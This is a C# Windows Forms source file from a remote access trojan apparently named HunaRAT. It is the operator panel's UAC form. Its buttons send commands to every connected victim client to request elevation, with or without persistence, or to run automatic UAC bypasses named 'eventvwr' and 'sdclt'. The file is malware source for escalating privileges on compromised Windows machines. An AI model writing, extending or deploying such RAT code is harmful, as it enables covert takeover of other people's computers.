using GoldenEye_Remote_Administration_Tool;
using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace HunaRAT.Forms
{
    public partial class UAC : Form
    {
        public List<Connection> Clientlist = new List<Connection>();

        public UAC()
        {
            InitializeComponent();
        }

        private void UAC_Load(object sender, EventArgs e)
        {
        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            if (checkBox1.Checked == true)
            {
                foreach (Connection clientLcl in Clientlist)
                {
                    clientLcl.Send("UAC|" + "ask" + "|" + "persist");
                }
            }
            else
            {
                foreach (Connection clientLcl in Clientlist)
                {
                    clientLcl.Send("UAC|" + "ask" + "|" + "nonpersist");
                }
            }

            MessageBox.Show("The Command has been successfully sent to the selected clients!");
            this.Close();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            foreach (Connection clientLcl in Clientlist)
            {
                clientLcl.Send("UAC|" + "auto" + "|" + "eventvwr");
            }
            MessageBox.Show("The Command has been successfully sent to the selected clients!");
            this.Close();
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            foreach (Connection clientLcl in Clientlist)
            {
                clientLcl.Send("UAC|" + "auto" + "|" + "sdclt");
            }
            MessageBox.Show("The Command has been successfully sent to the selected clients!");
            this.Close();
        }

        private void themeContainer1_Click(object sender, EventArgs e)
        {
        }

        private void checkBox1_CheckedChanged(object sender)
        {
        }

        private void velyseForm1_Click(object sender, EventArgs e)
        {
        }
    }
}